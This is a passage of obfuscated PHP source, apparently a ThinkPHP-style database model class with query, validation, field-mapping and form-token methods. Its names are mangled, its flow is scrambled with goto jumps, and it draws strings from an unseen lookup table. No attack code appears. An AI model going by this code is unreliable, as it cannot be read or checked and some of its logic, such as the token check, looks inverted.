= array()) { goto AÉ’âáé®; a™é•ó˜: $C‘ÔˆÂÛªÃ = $this->_parseOptions(); $bŠ‹ÂÃ„ŒÆ = $this->db->select($C‘ÔˆÂÛªÃ); if (!1 === $bŠ‹ÂÃ„ŒÆ) { return !1; } goto FÚåí¨“Ìä; aìÈê¿‚¨: if (!empty($this->options[$EŸœöœÊŸœ[290]])) { return $this->returnResult($this->data, $this->options[$EŸœöœÊŸœ[290]]); } return $this->data; goto D“¹Ïï‡ÃÜ; AÉ’âáé®: $EŸœöœÊŸœ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_numeric($C‘ÔˆÂÛªÃ) || is_string($C‘ÔˆÂÛªÃ)) { $B‹Â®¿ó·Ô[$this->getPk()] = intval($C‘ÔˆÂÛªÃ); $this->options[$EŸœöœÊŸœ[272]] = $B‹Â®¿ó·Ô; } $this->options[$EŸœöœÊŸœ[289]] = 1; goto a™é•ó˜; FÚåí¨“Ìä: if (empty($bŠ‹ÂÃ„ŒÆ)) { return null; } $this->data = $bŠ‹ÂÃ„ŒÆ[0]; $this->_afterFind($this->data, $C‘ÔˆÂÛªÃ); goto aìÈê¿‚¨; D“¹Ïï‡ÃÜ: } protected function _afterFind(&$dîÚ‚ŠÚ“å, $Fä·¼¦©÷§) { } protected function returnResult($a¶é×³²¤, $F¸‚ê×í¨ë = '') { $aœŞá³ù¶ó =& $_SERVER[¬ı§†‰ú˜¼]; if ($F¸‚ê×í¨ë) { if (is_callable($F¸‚ê×í¨ë)) { return call_user_func($F¸‚ê×í¨ë, $a¶é×³²¤); } switch (strtolower($F¸‚ê×í¨ë)) { case $aœŞá³ù¶ó[291]: return json_encode($a¶é×³²¤); case $aœŞá³ù¶ó[292]: return xml_encode($a¶é×³²¤); } } return $a¶é×³²¤; } public function parseFieldsMap($f‹Ø”…ö¨à, $A–² Î•É = 1) { if (!empty($this->_map)) { foreach ($this->_map as $e¨¼“£Ÿó => $DÒ×Ö¾ÕÜ‡) { if ($A–² Î•É == 1) { if (isset($f‹Ø”…ö¨à[$DÒ×Ö¾ÕÜ‡])) { $f‹Ø”…ö¨à[$e¨¼“£Ÿó] = $f‹Ø”…ö¨à[$DÒ×Ö¾ÕÜ‡]; unset($f‹Ø”…ö¨à[$DÒ×Ö¾ÕÜ‡]); } } else { if (isset($f‹Ø”…ö¨à[$e¨¼“£Ÿó])) { $f‹Ø”…ö¨à[$DÒ×Ö¾ÕÜ‡] = $f‹Ø”…ö¨à[$e¨¼“£Ÿó]; unset($f‹Ø”…ö¨à[$e¨¼“£Ÿó]); } } } } return $f‹Ø”…ö¨à; } public function setField($f¼›È¥§á¥, $bŠ¨ó¹¤Š´ = '') { if (is_array($f¼›È¥§á¥)) { $BøÇ§Ü³‚ = $f¼›È¥§á¥; } else { $BøÇ§Ü³‚[$f¼›È¥§á¥] = $bŠ¨ó¹¤Š´; } return $this->save($BøÇ§Ü³‚); } public function setAdd($bäƒ„èÂŠ½, $c»¯¸‹¥š» = 1) { $d„—õö´¯ =& $_SERVER[¬ı§†‰ú˜¼]; $a°É†®´Ûò = $bäƒ„èÂŠ½ . $d„—õö´¯[293] . $c»¯¸‹¥š»; if ($c»¯¸‹¥š» < 0) { $a°É†®´Ûò = $bäƒ„èÂŠ½ . $c»¯¸‹¥š»; } return $this->setField($bäƒ„èÂŠ½, array($d„—õö´¯[294], $a°É†®´Ûò)); } public function getField($cï²ºô‘³¡, $C”óóŸàÆé = null) { $dÒùòåìÆ‹ =& $_SERVER[¬ı§†‰ú˜¼]; $BåÛ›‘’÷º[$dÒùòåìÆ‹[270]] = $cï²ºô‘³¡; $BåÛ›‘’÷º = $this->_parseOptions($BåÛ›‘’÷º); $cï²ºô‘³¡ = trim($cï²ºô‘³¡); if (strpos($cï²ºô‘³¡, $dÒùòåìÆ‹[47])) { if (!isset($BåÛ›‘’÷º[$dÒùòåìÆ‹[289]])) { $BåÛ›‘’÷º[$dÒùòåìÆ‹[289]] = is_numeric($C”óóŸàÆé) ? $C”óóŸàÆé : $dÒùòåìÆ‹[33]; } $a›èÊ¸ = $this->db->select($BåÛ›‘’÷º); if (!empty($a›èÊ¸)) { goto CêšƒìíÂ; CêšƒìíÂ: $dŒª©¡˜Ãµ = explode($dÒùòåìÆ‹[47], $cï²ºô‘³¡); $cï²ºô‘³¡ = array_keys($a›èÊ¸[0]); $bƒìâŠà = array_shift($cï²ºô‘³¡); goto f‡©¹ˆ±äå; D©½Éñ›Ôé: foreach ($a›èÊ¸ as $fŞ—Æ”™) { $B±íšÃã’ = $fŞ—Æ”™[$bƒìâŠà]; if (2 == $c’‡•¸Âµ) { $D´ó‚Îñ‡ƒ[$B±íšÃã’] = $fŞ—Æ”™[$BîîïÃÂ]; } else { $D´ó‚Îñ‡ƒ[$B±íšÃã’] = is_string($C”óóŸàÆé) ? implode($C”óóŸàÆé, $fŞ—Æ”™) : $fŞ—Æ”™; } } return $D´ó‚Îñ‡ƒ; goto CŒˆßÆ³; f‡©¹ˆ±äå: $BîîïÃÂ = array_shift($cï²ºô‘³¡); $D´ó‚Îñ‡ƒ = array(); $c’‡•¸Âµ = count($dŒª©¡˜Ãµ); goto D©½Éñ›Ôé; CŒˆßÆ³: } } else { if (!0 !== $C”óóŸàÆé) { $BåÛ›‘’÷º[$dÒùòåìÆ‹[289]] = is_numeric($C”óóŸàÆé) ? $C”óóŸàÆé : 1; } if ($C”óóŸàÆé === $dÒùòåìÆ‹[252]) { unset($BåÛ›‘’÷º[$dÒùòåìÆ‹[289]]); } $fŞ—Æ”™ = $this->db->select($BåÛ›‘’÷º); if (!empty($fŞ—Æ”™)) { if ($C”óóŸàÆé === $dÒùòåìÆ‹[252]) { return reset($fŞ—Æ”™[0]); } if (!0 !== $C”óóŸàÆé && 1 == $BåÛ›‘’÷º[$dÒùòåìÆ‹[289]]) { return reset($fŞ—Æ”™[0]); } foreach ($fŞ—Æ”™ as $Fã¡»ñÒÈ“) { $e‹ƒé–‹¤”[] = $Fã¡»ñÒÈ“[$cï²ºô‘³¡]; } return $e‹ƒé–‹¤”; } } return null; } public function create($Bë’ ¢¾Û  = '', $bÙ¸¨Û¸ğ– = '') { goto E®Ü‡Ô¾; Bƒ·¿©¥…: if ($this->autoCheckFields) { $dĞƒÑÚ ¥£ = $this->getDbFields(); foreach ($Bë’ ¢¾Û  as $dù­â„’à => $C›æáÜĞ‚) { if (!in_array($dù­â„’à, $dĞƒÑÚ ¥£)) { unset($Bë’ ¢¾Û [$dù­â„’à]); } elseif (MAGIC_QUOTES_GPC && is_string($C›æáÜĞ‚)) { $Bë’ ¢¾Û [$dù­â„’à] = stripslashes($C›æáÜĞ‚); } } } $this->autoOperation($Bë’ ¢¾Û , $bÙ¸¨Û¸ğ–); $this->data = $Bë’ ¢¾Û ; goto b­äÒ¥¤È®; E®Ü‡Ô¾: $EšÑ‘à«Ã =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($Bë’ ¢¾Û )) { $Bë’ ¢¾Û  = $_POST; } elseif (is_object($Bë’ ¢¾Û )) { $Bë’ ¢¾Û  = get_object_vars($Bë’ ¢¾Û ); } if (empty($Bë’ ¢¾Û ) || !is_array($Bë’ ¢¾Û )) { $this->error = think_lang($EšÑ‘à«Ã[268]); return !1; } goto dìŸõ…œÉñ; b­äÒ¥¤È®: return $Bë’ ¢¾Û ; goto eÎåê†ôî‹; eæÚÜ©·ÛÏ: if (isset($dĞƒÑÚ ¥£)) { if (is_string($dĞƒÑÚ ¥£)) { $dĞƒÑÚ ¥£ = explode($EšÑ‘à«Ã[47], $dĞƒÑÚ ¥£); } if (think_config($EšÑ‘à«Ã[295])) { $dĞƒÑÚ ¥£[] = think_config($EšÑ‘à«Ã[296]); } foreach ($Bë’ ¢¾Û  as $dù­â„’à => $C›æáÜĞ‚) { if (!in_array($dù­â„’à, $dĞƒÑÚ ¥£)) { unset($Bë’ ¢¾Û [$dù­â„’à]); } } } if (!$this->autoValidation($Bë’ ¢¾Û , $bÙ¸¨Û¸ğ–)) { return !1; } if (!$this->autoCheckToken($Bë’ ¢¾Û )) { $this->error = think_lang($EšÑ‘à«Ã[297]); return !1; } goto Bƒ·¿©¥…; dìŸõ…œÉñ: $Bë’ ¢¾Û  = $this->parseFieldsMap($Bë’ ¢¾Û , 0); $bÙ¸¨Û¸ğ– = $bÙ¸¨Û¸ğ– ? $bÙ¸¨Û¸ğ– : (!empty($Bë’ ¢¾Û [$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$EšÑ‘à«Ã[270]])) { $dĞƒÑÚ ¥£ = $this->options[$EšÑ‘à«Ã[270]]; unset($this->options[$EšÑ‘à«Ã[270]]); } elseif ($bÙ¸¨Û¸ğ– == THINK_MODEL_INSERT && isset($this->insertFields)) { $dĞƒÑÚ ¥£ = $this->insertFields; } elseif ($bÙ¸¨Û¸ğ– == THINK_MODEL_UPDATE && isset($this->updateFields)) { $dĞƒÑÚ ¥£ = $this->updateFields; } goto eæÚÜ©·ÛÏ; eÎåê†ôî‹: } public function autoCheckToken($ašç×‰¢˜) { $dÛƒ°·…İª =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($this->options[$dÛƒ°·…İª[298]]) && !$this->options[$dÛƒ°·…İª[298]]) { return !0; } if (think_config($dÛƒ°·…İª[295])) { $FÄº˜æí™ó = think_config($dÛƒ°·…İª[296]); if (!isset($ašç×‰¢˜[$FÄº˜æí™ó]) || Session::get($FÄº˜æí™ó)) { return !1; } list($c„˜‹ÍíĞä, $aöâªŠÜ») = explode($dÛƒ°·…İª[71], $ašç×‰¢˜[$FÄº˜æí™ó]); if ($aöâªŠÜ» && Session::get($FÄº˜æí™ó . $dÛƒ°·…İª[95] . $c„˜‹ÍíĞä) === $aöâªŠÜ») { Session::remove($FÄº˜æí™ó . $dÛƒ°·…İª[95] . $c„˜‹ÍíĞä); return !0; } if (think_config($dÛƒ°·…İª[299])) { Session::remove($FÄº˜æí™ó . $dÛƒ°·…İª[95] . $c„˜‹ÍíĞä); } return !1; } return !0; } public function regex($dÛÇòÑó’, $dß×£•é“) { $b†‘¯à =& $_SERVER[¬ı§†‰ú˜¼]; $Cä¸¨ØÀÜ¨ = array($b†‘¯à[300] => $b†‘¯à[301], $b†‘¯à[302] => $b†‘¯à[303], $b†‘¯à[304] => $b†‘¯à[305], $b†‘¯à[306] => $b†‘¯à[307], $b†‘¯à[308] => $b†‘¯à[309], $b†‘¯à[310] => $b†‘¯à[311], $b†‘¯à[312] => $b†‘¯à[313], $b†‘¯à[287] => $b†‘¯à[314], $b†‘¯à[315] => $b†‘¯à[316]); if (isset($Cä¸¨ØÀÜ¨[strtolower($dß×£•é“)])) { $dß×£•é“ = $Cä¸¨ØÀÜ¨[strtolower($dß×£•é“)]; } return preg_match($dß×£•é“, $dÛÇòÑó’) === 1; } private function autoOperation(&$FàÌàŒ³í, $c¡ğ–Ï§ë) { $BãİÎŠñ¶Á =& $_SERVER[¬ı§†‰ú˜¼]; if (!empty($this->options[$BãİÎŠñ¶Á[317]])) { $Bù‰•¶¬è‡ = $this->options[$BãİÎŠñ¶Á[317]]; unset($this->options[$BãİÎŠñ¶Á[317]]); } elseif (!empty($this->_auto)) { $Bù‰•¶¬è‡ = $this->_auto; } if (isset($Bù‰•¶¬è‡)) { foreach ($Bù‰•¶¬è‡ as $CËË½ö§©) { if (empty($CËË½ö§©[2])) { $CËË½ö§©[2] = THINK_MODEL_INSERT; } if ($c¡ğ–Ï§ë == $CËË½ö§©[2] || $CËË½ö§©[2] == THINK_MODEL_BOTH) { switch (trim($CËË½ö§©[3])) { case $BãİÎŠñ¶Á[318]: case $BãİÎŠñ¶Á[319]: $DÏŸØ¸Ë« = isset($CËË½ö§©[4]) ? (array) $CËË½ö§©[4] : array(); if (isset($FàÌàŒ³í[$CËË½ö§©[0]])) { array_unshift($DÏŸØ¸Ë«, $FàÌàŒ³í[$CËË½ö§©[0]]); } if ($BãİÎŠñ¶Á[318] == $CËË½ö§©[3]) { $FàÌàŒ³í[$CËË½ö§©[0]] = call_user_func_array($CËË½ö§©[1], $DÏŸØ¸Ë«); } else { $FàÌàŒ³í[$CËË½ö§©[0]] = call_user_func_array(array(&$this, $CËË½ö§©[1]), $DÏŸØ¸Ë«); } break; case $BãİÎŠñ¶Á[270]: $FàÌàŒ³í[$CËË½ö§©[0]] = $FàÌàŒ³í[$CËË½ö§©[1]]; break; case $BãİÎŠñ¶Á[320]: if ($BãİÎŠñ¶Á[33] === $FàÌàŒ³í[$CËË½ö§©[0]]) { unset($FàÌàŒ³í[$CËË½ö§©[0]]); } break; case $BãİÎŠñ¶Á[321]: default: $FàÌàŒ³í[$CËË½ö§©[0]] = $CËË½ö§©[1]; } if (!1 === $FàÌàŒ³í[$CËË½ö§©[0]]) { unset($FàÌàŒ³í[$CËË½ö§©[0]]); } } } } return $FàÌàŒ³í; } protected function autoValidation($c½Éò¤õ“, $f©¥“ªô÷) { $F÷¹Êö¬Àå =& $_SERVER[¬ı§†‰ú˜¼]; if (!empty($this->options[$F÷¹Êö¬Àå[322]])) { $B¨¡²µÎƒÁ = $this->options[$F÷¹Êö¬Àå[322]]; unset($this->options[$F÷¹Êö¬Àå[322]]); } elseif (!empty($this->_validate)) { $B¨¡²µÎƒÁ = $this->_validate; } if (isset($B¨¡²µÎƒÁ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B¨¡²µÎƒÁ as $B‰“„»¸ó => $FŠ¾è”ˆÓ¶) { if (empty($FŠ¾è”ˆÓ¶[5]) || $FŠ¾è”ˆÓ¶[5] == THINK_MODEL_BOTH || $FŠ¾è”ˆÓ¶[5] == $f©¥“ªô÷) { if (0 == strpos($FŠ¾è”ˆÓ¶[2], $F÷¹Êö¬Àå[323]) && strpos($FŠ¾è”ˆÓ¶[2], $F÷¹Êö¬Àå[324])) { $FŠ¾è”ˆÓ¶[2] = think_lang(substr($FŠ¾è”ˆÓ¶[2], 2, -1)); } $FŠ¾è”ˆÓ¶[3] = isset($FŠ¾è”ˆÓ¶[3]) ? $FŠ¾è”ˆÓ¶[3] : THINK_EXISTS_VALIDATE; $FŠ¾è”ˆÓ¶[4] = isset($FŠ¾è”ˆÓ¶[4]) ? $FŠ¾è”ˆÓ¶[4] : $F÷¹Êö¬Àå[325]; switch ($FŠ¾è”ˆÓ¶[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($c½Éò¤õ“, $FŠ¾è”ˆÓ¶)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($F÷¹Êö¬Àå[33] != trim($c½Éò¤õ“[$FŠ¾è”ˆÓ¶[0]])) { if (!1 === $this->_validationField($c½Éò¤õ“, $FŠ¾è”ˆÓ¶)) { return !1; } } break; default: if (isset($c½Éò¤õ“[$FŠ¾è”ˆÓ¶[0]])) { if (!1 === $this->_validationField($c½Éò¤õ“, $FŠ¾è”ˆÓ¶)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($fÅë˜¼¸ÎÕ, $DÒ—²™ê¸) { if (!1 === $this->_validationFieldItem($fÅë˜¼¸ÎÕ, $DÒ—²™ê¸)) { if ($this->patchValidate) { $this->error[$DÒ—²™ê¸[0]] = $DÒ—²™ê¸[2]; } else { $this->error = $DÒ—²™ê¸[2]; return !1; } } return; } protected function _validationFieldItem($AâÛ¤Ô¦, $DßËø—¨ëó) { $E¶‡ÍÜ–  =& $_SERVER[¬ı§†‰ú˜¼]; switch (strtolower(trim($DßËø—¨ëó[4]))) { case $E¶‡ÍÜ– [318]: case $E¶‡ÍÜ– [319]: $Bëâ™¥Âà· = isset($DßËø—¨ëó[6]) ? (array) $DßËø—¨ëó[6] : array(); if (is_string($DßËø—¨ëó[0]) && strpos($DßËø—¨ëó[0], $E¶‡ÍÜ– [47])) { $DßËø—¨ëó[0] = explode($E¶‡ÍÜ– [47], $DßËø—¨ëó[0]); } if (is_array($DßËø—¨ëó[0])) { foreach ($DßËø—¨ëó[0] as $d¥­ºí†ï‘) { $DÕÊ¿¿¹[$d¥­ºí†ï‘] = $AâÛ¤Ô¦[$d¥­ºí†ï‘]; } array_unshift($Bëâ™¥Âà·, $DÕÊ¿¿¹); } else { array_unshift($Bëâ™¥Âà·, $AâÛ¤Ô¦[$DßËø—¨ëó[0]]); } if ($E¶‡ÍÜ– [318] == $DßËø—¨ëó[4]) { return call_user_func_array($DßËø—¨ëó[1], $Bëâ™¥Âà·); } else { return call_user_func_array(array(&$this, $DßËø—¨ëó[1]), $Bëâ™¥Âà·); } case $E¶‡ÍÜ– [326]: return $AâÛ¤Ô¦[$DßËø—¨ëó[0]] == $AâÛ¤Ô¦[$DßËø—¨ëó[1]]; case $E¶‡ÍÜ– [327]: if (is_string($DßËø—¨ëó[0]) && strpos($DßËø—¨ëó[0], $E¶‡ÍÜ– [47])) { $DßËø—¨ëó[0] = explode($E¶‡ÍÜ– [47], $DßËø—¨ëó[0]); } $BÕ­’ŸŒ²Ş = array(); if (is_array($DßËø—¨ëó[0])) { foreach ($DßËø—¨ëó[0] as $d¥­ºí†ï‘) { $BÕ­’ŸŒ²Ş[$d¥­ºí†ï‘] = $AâÛ¤Ô¦[$d¥­ºí†ï‘]; } } else { $BÕ­’ŸŒ²Ş[$DßËø—¨ëó[0]] = $AâÛ¤Ô¦[$DßËø—¨ëó[0]]; } if (!empty($AâÛ¤Ô¦[$this->getPk()])) { $BÕ­’ŸŒ²Ş[$this->getPk()] = array($E¶‡ÍÜ– [328], $AâÛ¤Ô¦[$this->getPk()]); } if ($this->where($BÕ­’ŸŒ²Ş)->find()) { return !1; } return !0; default: return $this->check($AâÛ¤Ô¦[$DßËø—¨ëó[0]], $DßËø—¨ëó[1], $DßËø—¨ëó[4]); } } public function check($fÈ£ˆ„áˆÊ, $c’‰…’Å³Ç, $c›Ù÷°¤ÉÜ = "\162\145\x67\x65\x78") { $FÌ“îÈøêì =& $_SERVER[¬ı§†‰ú˜¼]; $c›Ù÷°¤ÉÜ = strtolower(trim($c›Ù÷°¤ÉÜ)); switch ($c›Ù÷°¤ÉÜ) { case $FÌ“îÈøêì[7]: case $FÌ“îÈøêì[329]: $C¤Á„ÛŠÍ· = is_array($c’‰…’Å³Ç) ? $c’‰…’Å³Ç : explode($FÌ“îÈøêì[47], $c’‰…’Å³Ç); return $c›Ù÷°¤ÉÜ == $FÌ“îÈøêì[7] ? in_array($fÈ£ˆ„áˆÊ, $C¤Á„ÛŠÍ·) : !in_array($fÈ£ˆ„áˆÊ, $C¤Á„ÛŠÍ·); case $FÌ“îÈøêì[330]: case $FÌ“îÈøêì[331]: if (is_array($c’‰…’Å³Ç)) { $F´ŠÑŠ§È« = $c’‰…’Å³Ç[0]; $aÒ”–ƒÔ´ = $c’‰…’Å³Ç[1]; } else { list($F´ŠÑŠ§È«, $aÒ”–ƒÔ´) = explode($FÌ“îÈøêì[47], $c’‰…’Å³Ç); } return $c›Ù÷°¤ÉÜ == $FÌ“îÈøêì[330] ? $fÈ£ˆ„áˆÊ >= $F´ŠÑŠ§È« && $fÈ£ˆ„áˆÊ <= $aÒ”–ƒÔ´ : $fÈ£ˆ„áˆÊ < $F´ŠÑŠ§È« || $fÈ£ˆ„áˆÊ > $aÒ”–ƒÔ´; case $FÌ“îÈøêì[332]: case $FÌ“îÈøêì[333]: return $c›Ù÷°¤ÉÜ == $FÌ“îÈøêì[332] ? $fÈ£ˆ„áˆÊ == $c’‰…’Å³Ç : $fÈ£ˆ„áˆÊ != $c’‰…’Å³Ç; case $FÌ“îÈøêì[334]: $Fğ±÷Û¼ÎÆ = mb_strlen($fÈ£ˆ„áˆÊ, $FÌ“îÈøêì[335]); if (strpos($c’‰…’Å³Ç, $FÌ“îÈøêì[47])) { list($F´ŠÑŠ§È«, $aÒ”–ƒÔ´) = explode($FÌ“îÈøêì[47], $c’‰…’Å³Ç); return $Fğ±÷Û¼ÎÆ >= $F´ŠÑŠ§È« && $Fğ±÷Û¼ÎÆ <= $aÒ”–ƒÔ´; } else { return $Fğ±÷Û¼ÎÆ == $c’‰…’Å³Ç; } case $FÌ“îÈøêì[336]: list($Fâ‹ªÔò…ğ, $c‰”Íëß²÷) = explode($FÌ“îÈøêì[47], $c’‰…’Å³Ç); if (!is_numeric($Fâ‹ªÔò…ğ)) { $Fâ‹ªÔò…ğ = strtotime($Fâ‹ªÔò…ğ); } if (!is_numeric($c‰”Íëß²÷)) { $c‰”Íëß²÷ = strtotime($c‰”Íëß²÷); } return NOW_TIME >= $Fâ‹ªÔò…ğ && NOW_TIME <= $c‰”Íëß²÷; case $FÌ“îÈøêì[337]: return in_array(get_client_ip(), explode($FÌ“îÈøêì[47], $c’‰…’Å³Ç)); case $FÌ“îÈøêì[338]: return !in_array(get_client_ip(), explode($FÌ“îÈøêì[47], $c’‰…’Å³Ç)); case $FÌ“îÈøêì[325]: default: return $this->regex($fÈ£ˆ„áˆÊ, $c’‰…’Å³Ç); } } public function query($b¢°ÎÇ‡²™, $bÌİÒ½°Ö = false) { $b”·İƒ¬ß =& $_SERVER[¬ı§†‰ú˜¼]; if (!is_bool($bÌİÒ½°Ö) && !is_array($bÌİÒ½°Ö)) { $bÌİÒ½°Ö = func_get_args(); array_shift($bÌİÒ½°Ö); } $b¢°ÎÇ‡²™ = str_replace(array($b”·İƒ¬ß[228], $b”·İƒ¬ß[339]), $b”·İƒ¬ß[50], $b¢°ÎÇ‡²™); $b¢°ÎÇ‡²™ = $this->parseSql($b¢°ÎÇ‡²™, $bÌİÒ½°Ö); return $this->db->query($b¢°ÎÇ‡²™); } public function execute($bê™À–øõõ, $A ÏìÈèÒ» = false) { if (!is_bool($A ÏìÈèÒ») && !is_array($A ÏìÈèÒ»)) { $A ÏìÈèÒ» = func_get_args(); array_shift($A ÏìÈèÒ»); } $bê™À–øõõ = $this->parseSql($bê™À–øõõ, $A ÏìÈèÒ»); return $this->db->execute($bê™À–øõõ); } protected function parseSql($c¡Ğ“Ã, $dñéíÊŞ™) { $d ÖšµÜÑ… =& $_SERVER[¬ı§†‰ú˜¼]; if (!0 === $dñéíÊŞ™) { $AÎ…éß—È = $this->_parseOptions(); $c¡Ğ“Ã = $this->db->parseSql($c¡Ğ“Ã, $AÎ…éß—È); } elseif (is_array($dñéíÊŞ™)) { $dñéíÊŞ™ = array_map(array($this->db, $d ÖšµÜÑ…[340]), $dñéíÊŞ™); $c¡Ğ“Ã = vsprintf($c¡Ğ“Ã, $dñéíÊŞ™); } else { $c¡Ğ“Ã = strtr($c¡Ğ“Ã, array($d ÖšµÜÑ…[341] => $this->getTableName(), $d ÖšµÜÑ…[342] => think_config($d ÖšµÜÑ…[241]))); } $this->db->setModel($this->name); return $c¡Ğ“Ã; } public function db($CßØ†ªŒÑÙ = '', $e‡Ìâœ›¶’ = '', $Cá ÜÌÜòİ = array()) { goto B…ğè‘Ó²Ş; e¢Œ©†—ŸŒ: $fÃ‚µ‚Ã†Í[$CßØ†ªŒÑÙ] = $e‡Ìâœ›¶’; $this->db = $Có¾ò™¥—Ê[$CßØ†ªŒÑÙ]; $this->_after_db(); goto CÁ¿­öáö­; CÁ¿­öáö­: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto e…é”¸´ÚÆ; a˜ƒí¥Æµ: static $Có¾ò™¥—Ê = array(); if (!isset($Có¾ò™¥—Ê[$CßØ†ªŒÑÙ]) || isset($Có¾ò™¥—Ê[$CßØ†ªŒÑÙ]) && $e‡Ìâœ›¶’ && $fÃ‚µ‚Ã†Í[$CßØ†ªŒÑÙ] != $e‡Ìâœ›¶’) { if (!empty($e‡Ìâœ›¶’) && is_string($e‡Ìâœ›¶’) && !1 === strpos($e‡Ìâœ›¶’, $A¤ÜÊ©÷[8])) { $e‡Ìâœ›¶’ = think_config($e‡Ìâœ›¶’); } $Có¾ò™¥—Ê[$CßØ†ªŒÑÙ] = Db::getInstance($e‡Ìâœ›¶’); } elseif (NULL === $e‡Ìâœ›¶’) { $Có¾ò™¥—Ê[$CßØ†ªŒÑÙ]->close(); unset($Có¾ò™¥—Ê[$CßØ†ªŒÑÙ]); return; } if (!empty($Cá ÜÌÜòİ)) { if (is_string($Cá ÜÌÜòİ)) { parse_str($Cá ÜÌÜòİ, $Cá ÜÌÜòİ); } foreach ($Cá ÜÌÜòİ as $a¥ƒõ­–¬“ => $dêÊöáøƒ) { $this->setProperty($a¥ƒõ­–¬“, $dêÊöáøƒ); } } goto e¢Œ©†—ŸŒ; B…ğè‘Ó²Ş: $A¤ÜÊ©÷ =& $_SERVER[¬ı§†‰ú˜¼]; if ($A¤ÜÊ©÷[33] === $CßØ†ªŒÑÙ && $this->db) { return $this->db; } static $fÃ‚µ‚Ã†Í = array(); goto a˜ƒí¥Æµ; e…é”¸´ÚÆ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D‚»¥‡Šîå = get_class($this); if ($D‚»¥‡Šîå == $_SERVER[¬ı§†‰ú˜¼][343]) { return $this->name; } $this->name = substr($D‚»¥‡Šîå, 0, -5); } return $this->name; } public function getTableName() { $E„ÀÕ’°Ü¸ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($this->trueTableName)) { $BâÎÇèÛøÊ = !empty($this->tablePrefix) ? $this->tablePrefix : $E„ÀÕ’°Ü¸[33]; if (!empty($this->tableName)) { $BâÎÇèÛøÊ .= $this->tableName; } else { $BâÎÇèÛøÊ .= think_parse_name($this->name); } $this->trueTableName = strtolower($BâÎÇèÛøÊ); } return (!empty($this->dbName) ? $this->dbName . $E„ÀÕ’°Ü¸[95] : $E„ÀÕ’°Ü¸[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $cÌÓäŠÈ…¢ =& $_SERVER[¬ı§†‰ú˜¼]; return isset($this->fields[$cÌÓäŠÈ…¢[248]]) ? $this->fields[$cÌÓäŠÈ…¢[248]] : $this->pk; } public function getDbFields() { $Aëâ‘Ë£¡Ê =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($this->options[$Aëâ‘Ë£¡Ê[276]])) { $Dˆ»°Ïë›æ = $this->db->getFields($this->options[$Aëâ‘Ë£¡Ê[276]]); return $Dˆ»°Ïë›æ ? array_keys($Dˆ»°Ïë›æ) : !1; } if ($this->fields) { $Dˆ»°Ïë›æ = $this->fields; unset($Dˆ»°Ïë›æ[$Aëâ‘Ë£¡Ê[247]], $Dˆ»°Ïë›æ[$Aëâ‘Ë£¡Ê[248]], $Dˆ»°Ïë›æ[$Aëâ‘Ë£¡Ê[249]], $Dˆ»°Ïë›æ[$Aëâ‘Ë£¡Ê[246]]); return $Dˆ»°Ïë›æ; } return !1; } public function data($dÖ†ŠË¯ = '') { $cÉ«‹íŞ°² =& $_SERVER[¬ı§†‰ú˜¼]; if ($cÉ«‹íŞ°²[33] === $dÖ†ŠË¯ && !empty($this->data)) { return $this->data; } if (is_object($dÖ†ŠË¯)) { $dÖ†ŠË¯ = get_object_vars($dÖ†ŠË¯); } elseif (is_string($dÖ†ŠË¯)) { parse_str($dÖ†ŠË¯, $dÖ†ŠË¯); } elseif (!is_array($dÖ†ŠË¯)) { think_exception(think_lang($cÉ«‹íŞ°²[268])); } $this->data = $dÖ†ŠË¯; return $this; } public function join($dÌÊ¸¿·™ù) { $DµÚ´«í„Ğ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_array($dÌÊ¸¿·™ù)) { $this->options[$DµÚ´«í„Ğ[279]] = $dÌÊ¸¿·™ù; } elseif (!empty($dÌÊ¸¿·™ù)) { $this->options[$DµÚ´«í„Ğ[279]][] = $dÌÊ¸¿·™ù; } return $this; } public function union($E‹İó¨¨Ş, $fšÄïÉ›İ¼ = false) { goto a¡†Ûã˜»…; DºãåÚÎš‡: if (is_object($E‹İó¨¨Ş)) { $E‹İó¨¨Ş = get_object_vars($E‹İó¨¨Ş); } if (is_string($E‹İó¨¨Ş)) { $BœŠÇ¬àÛ‚ = $E‹İó¨¨Ş; } elseif (is_array($E‹İó¨¨Ş)) { if (isset($E‹İó¨¨Ş[0])) { $this->options[$A¥Áº©¡ë¡[344]] = array_merge($this->options[$A¥Áº©¡ë¡[344]], $E‹İó¨¨Ş); return $this; } else { $BœŠÇ¬àÛ‚ = $E‹İó¨¨Ş; } } else { think_exception(think_lang($A¥Áº©¡ë¡[268])); } $this->options[$A¥Áº©¡ë¡[344]][] = $BœŠÇ¬àÛ‚; goto B½ù¯§»ôË; B½ù¯§»ôË: return $this; goto aÜ˜†¤éî; a¡†Ûã˜»…: $A¥Áº©¡ë¡ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($E‹İó¨¨Ş)) { return $this; } if ($fšÄïÉ›İ¼) { $this->options[$A¥Áº©¡ë¡[344]][$A¥Áº©¡ë¡[345]] = !0; } goto DºãåÚÎš‡; aÜ˜†¤éî: } public function cache($cÅª¥˜Ìƒâ = true, $fî×¿ÇÚä° = null, $b§è’¾ĞŞ’ = '') { $DÙí´Ùã¸ =& $_SERVER[¬ı§†‰ú˜¼]; if (!1 !== $cÅª¥˜Ìƒâ) { $this->options[$DÙí´Ùã¸[346]] = array($DÙí´Ùã¸[93] => $cÅª¥˜Ìƒâ, $DÙí´Ùã¸[336] => $fî×¿ÇÚä°, $DÙí´Ùã¸[29] => $b§è’¾ĞŞ’); } return $this; } public function field($Dé…¬È Š÷, $dƒìÇîáó­ = false) { $FÉÂÔ³«ëº =& 